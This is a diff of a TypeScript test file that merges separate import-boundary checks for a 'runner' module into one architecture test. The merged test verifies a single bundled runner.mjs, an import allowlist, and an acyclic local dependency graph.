+const importsOf = (code: string) => [...code.matchAll(/from\s+["']([^"']+)["']/g)].map((m) => m[1]!);
 
-function extractImports(code: string): string[] {
-  const imports: string[] = [];
-  for (const match of code.matchAll(/from\s+["']([^"']+)["']/g)) {
-    imports.push(match[1]!);
-  }
-  return imports;
-}
+describe("runner bundle architecture", () => {
+  it("ships one runner.mjs importing only Node built-ins, built from runner modules with an allowlisted, acyclic import graph", () => {
+    expect(readdirSync(runnerDir)).toEqual(["runner.mjs"]);
+    const bundle = readFileSync(join(runnerDir, "runner.mjs"), "utf8");
+    const bundleImports = [...bundle.matchAll(/^import\b[^;]*?\bfrom\s+"([^"]+)"/gm)].map((m) => m[1]!);
+    expect(bundleImports.length).toBeGreaterThan(0);
+    expect(bundleImports.filter((spec) => !isBuiltin(spec))).toEqual([]);
 
-describe("runner import boundary", () => {
-  const files = readdirSync(RUNNER_DIR).filter((f) => f.endsWith(".ts") && !f.endsWith(".d.ts"));
-
-  it("files under src/runner/ import only from src/runner/*, the shared modules, Node built-ins, or the runner packages", () => {
+    const files = readdirSync(RUNNER_DIR).filter((f) => f.endsWith(".ts") && !f.endsWith(".d.ts"));
     const violations: string[] = [];
-
+    const localDeps = new Map<string, string[]>();
     for (const file of files) {
-      const code = readFileSync(join(RUNNER_DIR, file), "utf8");
-      for (const spec of extractImports(code)) {
-        if (spec.startsWith("node:") || spec.startsWith("./")) continue;
+      const specs = importsOf(readFileSync(join(RUNNER_DIR, file), "utf8"));
+      localDeps.set(file, specs.flatMap((s) => (/^\.\/[^/]+\.ts$/.test(s) ? [s.slice(2)] : [])));
+      for (const spec of specs) {
+        if (spec.startsWith("node:") || spec.startsWith("./") || spec.endsWith("?raw")) continue;
         if (spec.startsWith("../") && SHARED_MODULES.has(spec.slice(3))) continue;
-        // ?raw imports are inlined as text, so the instance prompt.md may live outside src/runner/.
-        if (spec.endsWith("?raw")) continue;
-        if (spec.startsWith("../")) {
-          violations.push(`${file}: imports "${spec}" (outside runner/ and not a shared module)`);
-          continue;
-        }
         const pkg = spec.startsWith("@") ? spec.split("/").slice(0, 2).join("/") : spec.split("/")[0]!;
-        if (RUNNER_PACKAGES.has(pkg)) continue;
-        violations.push(`${file}: imports "${spec}" (not a runner package or Node built-in)`);
+        if (!spec.startsWith("../") && RUNNER_PACKAGES.has(pkg)) continue;
+        violations.push(`${file} imports ${spec}`);
       }
     }
-
-    expect(violations).toEqual([]);
-  });
-
-  it("shared modules import only zod and each other", () => {
-    const violations: string[] = [];
     for (const file of SHARED_MODULES) {
-      for (const spec of extractImports(readFileSync(join(RUNNER_DIR, "..", file), "utf8"))) {
+      for (const spec of importsOf(readFileSync(join(RUNNER_DIR, "..", file), "utf8"))) {
         if (spec === "zod" || (spec.startsWith("./") && SHARED_MODULES.has(spec.slice(2)))) continue;
-        violations.push(`${file}: imports "${spec}"`);
+        violations.push(`${file} imports ${spec}`);
       }
     }
     expect(violations).toEqual([]);
-  });
 
-  it("has no import cycles between src/runner/ modules", () => {
-    const deps = new Map(
-      files.map((f) => [f, extractImports(readFileSync(join(RUNNER_DIR, f), "utf8")).flatMap((s) => (/^\.\/[^/]+\.ts$/.test(s) ? [s.slice(2)] : []))]),
-    );
     const cycles: string[] = [];
     const visit = (file: string, path: string[]) => {
       if (path.includes(file)) return void cycles.push([...path.slice(path.indexOf(file)), file].join(" -> "));
-      for (const dep of deps.get(file) ?? []) visit(dep, [...path, file]);
+      for (const dep of localDeps.get(file) ?? []) visit(dep, [...path, file]);
     };
     for (const file of files) visit(file, []);
     expect(cycles).toEqual([]);
